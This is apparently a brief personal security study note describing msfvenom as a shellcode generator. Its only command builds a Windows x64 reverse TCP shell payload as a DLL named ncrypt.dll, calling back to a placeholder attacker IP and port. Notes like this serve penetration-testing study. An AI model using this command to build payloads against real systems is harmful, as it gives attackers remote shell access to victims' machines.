---
tags:
  - security
---
A tool to generate shellcode.
# Outputting as [[Dynamic Linked Library|DLL]]
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=myip LPORT=myport -f dll -o ncrypt.dll
```